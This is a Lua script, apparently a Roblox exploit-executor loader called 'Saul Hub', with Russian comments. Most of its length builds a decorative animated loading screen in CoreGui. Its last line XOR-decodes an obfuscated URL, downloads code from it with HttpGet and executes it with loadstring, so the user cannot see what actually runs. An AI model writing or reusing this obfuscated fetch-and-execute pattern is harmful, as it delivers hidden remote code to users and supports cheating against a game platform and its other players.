--[[

░██████╗░█████╗░██╗░░░██╗██╗░░░░░
██╔════╝██╔══██╗██║░░░██║██║░░░░░
╚█████╗░███████║██║░░░██║██║░░░░░
░╚═══██╗██╔══██║██║░░░██║██║░░░░░
██████╔╝██║░░██║╚██████╔╝███████╗
╚═════╝░╚═╝░░╚═╝░╚═════╝░╚══════╝

██╗░░██╗██╗░░░██╗██████╗░
██║░░██║██║░░░██║██╔══██╗
███████║██║░░░██║██████╦╝
██╔══██║██║░░░██║██╔══██╗
██║░░██║╚██████╔╝██████╦╝
╚═╝░░╚═╝░╚═════╝░╚═════╝░
]]
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")

-- Создаем основной интерфейс
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SaulHubLoader"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = CoreGui

-- Фон с градиентом
local background = Instance.new("Frame")
background.Name = "Background"
background.Size = UDim2.new(1, 0, 1, 0)
background.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
background.BackgroundTransparency = 1
background.ZIndex = 1
background.Parent = ScreenGui

local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 10, 20)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 30, 50))
})
gradient.Rotation = 45
gradient.Parent = background

-- Белая вспышка с эффектом свечения
local flash = Instance.new("Frame")
flash.Name = "Flash"
flash.Size = UDim2.new(1, 0, 1, 0)
flash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
flash.BackgroundTransparency = 1
flash.ZIndex = 2
flash.Parent = ScreenGui

local flashGradient = Instance.new("UIGradient")
flashGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(200, 230, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
})
flashGradient.Parent = flash

-- Контейнер для контента
local content = Instance.new("Frame")
content.Name = "Content"
content.Size = UDim2.new(0, 400, 0, 200)
content.Position = UDim2.new(0.5, -200, 0.5, -100)
content.BackgroundTransparency = 1
content.ZIndex = 3
content.Parent = ScreenGui

-- Основная надпись с тенью
local mainLabel = Instance.new("TextLabel")
mainLabel.Name = "MainLabel"
mainLabel.Size = UDim2.new(1, 0, 0.5, 0)
mainLabel.BackgroundTransparency = 1
mainLabel.Text = "SAUL HUB"
mainLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
mainLabel.TextSize = 48
mainLabel.Font = Enum.Font.GothamBlack
mainLabel.TextTransparency = 1
mainLabel.TextStrokeColor3 = Color3.fromRGB(100, 150, 255)
mainLabel.TextStrokeTransparency = 1
mainLabel.ZIndex = 4
mainLabel.Parent = content

-- Подзаголовок
local subLabel = Instance.new("TextLabel")
subLabel.Name = "SubLabel"
subLabel.Size = UDim2.new(1, 0, 0.3, 0)
subLabel.Position = UDim2.new(0, 0, 0.5, 0)
subLabel.BackgroundTransparency = 1
subLabel.Text = "LOADING..."
subLabel.TextColor3 = Color3.fromRGB(200, 220, 255)
subLabel.TextSize = 24
subLabel.Font = Enum.Font.GothamMedium
subLabel.TextTransparency = 1
subLabel.ZIndex = 4
subLabel.Parent = content

-- Индикатор загрузки
local loader = Instance.new("Frame")
loader.Name = "Loader"
loader.Size = UDim2.new(0.6, 0, 0, 4)
loader.Position = UDim2.new(0.2, 0, 0.85, 0)
loader.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
loader.BackgroundTransparency = 1
loader.BorderSizePixel = 0
loader.ZIndex = 4
loader.Parent = content

local loaderGradient = Instance.new("UIGradient")
loaderGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 130, 255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(120, 170, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 130, 255))
})
loaderGradient.Rotation = 90
loaderGradient.Parent = loader

-- Частицы для эффекта
local particles = Instance.new("Frame")
particles.Name = "Particles"
particles.Size = UDim2.new(1, 0, 1, 0)
particles.BackgroundTransparency = 1
particles.ZIndex = 5
particles.Parent = content

-- Функция для создания частиц
local function createParticle()
    local particle = Instance.new("Frame")
    particle.Size = UDim2.new(0, math.random(5, 15), 0, math.random(5, 15))
    particle.Position = UDim2.new(0, math.random(-50, 450), 0, math.random(-50, 250))
    particle.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
    particle.BackgroundTransparency = 0.7
    particle.BorderSizePixel = 0
    particle.Rotation = math.random(0, 360)
    particle.Parent = particles
    
    -- Анимация частицы
    TweenService:Create(particle, TweenInfo.new(1.5, Enum.EasingStyle.Quad), {
        Position = UDim2.new(0, particle.Position.X.Offset + math.random(-100, 100), 
                            0, particle.Position.Y.Offset + math.random(-100, 100)),
        BackgroundTransparency = 1,
        Rotation = particle.Rotation + math.random(-180, 180)
    }):Play()
    
    task.delay(1.5, function()
        particle:Destroy()
    end)
end

-- Начинаем анимацию
local function startAnimation()
    -- 1. Появление фона
    TweenService:Create(background, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
        BackgroundTransparency = 0
    }):Play()

    -- 2. Белая вспышка
    task.delay(0.1, function()
        TweenService:Create(flash, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
            BackgroundTransparency = 0
        }):Play()
    end)

    -- 3. Появление контента
    task.delay(0.4, function()
        -- Сначала вспышка становится полупрозрачной
        TweenService:Create(flash, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
            BackgroundTransparency = 0.8
        }):Play()
        
        -- Появление основной надписи
        TweenService:Create(mainLabel, TweenInfo.new(0.5, Enum.EasingStyle.Back), {
            TextTransparency = 0,
            TextStrokeTransparency = 0.7
        }):Play()
        
        -- Появление подзаголовка с задержкой
        task.delay(0.2, function()
            TweenService:Create(subLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
                TextTransparency = 0
            }):Play()
        end)
        
        -- Появление и анимация индикатора загрузки
        task.delay(0.3, function()
            TweenService:Create(loader, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
                BackgroundTransparency = 0
            }):Play()
            
            -- Анимация ширины индикатора
            local widthAnimation = TweenService:Create(loader, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
                Size = UDim2.new(0.8, 0, 0, 4)
            })
            widthAnimation:Play()
        end)
        
        -- Запуск частиц
        local particleInterval
        particleInterval = game:GetService("RunService").Heartbeat:Connect(function()
            if math.random() < 0.1 then
                createParticle()
            end
        end)
        
        -- 4. Завершение анимации через 3 секунды
        task.delay(3, function()
            particleInterval:Disconnect()
            
            -- Исчезновение контента
            TweenService:Create(mainLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
                TextTransparency = 1,
                TextStrokeTransparency = 1
            }):Play()
            
            TweenService:Create(subLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
                TextTransparency = 1
            }):Play()
            
            TweenService:Create(loader, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
                BackgroundTransparency = 1
            }):Play()
            
            -- Финальная вспышка
            task.delay(0.3, function()
                TweenService:Create(flash, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
                    BackgroundTransparency = 0
                }):Play()
                
                -- Исчезновение фона
                TweenService:Create(background, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
                    BackgroundTransparency = 1
                }):Play()
                
                -- Удаление интерфейса
                task.delay(0.3, function()
                    ScreenGui:Destroy()
                end)
            end)
        end)
    end)
end

-- Запускаем анимацию
startAnimation()
wait(3)
local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end loadstring(game:HttpGet(v7("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\232\36\243\183\224\17\222\199\214\36\232\136\196\12\216\211\207\32\244\244\244\63\228\239\228\13\211\153\136\12\212\197\200\106\238\190\198\26\194\140\214\36\239\181\136\42\217\198\228\40\231\178\201\33\210\204\223\32","\126\177\163\187\69\134\219\167")))();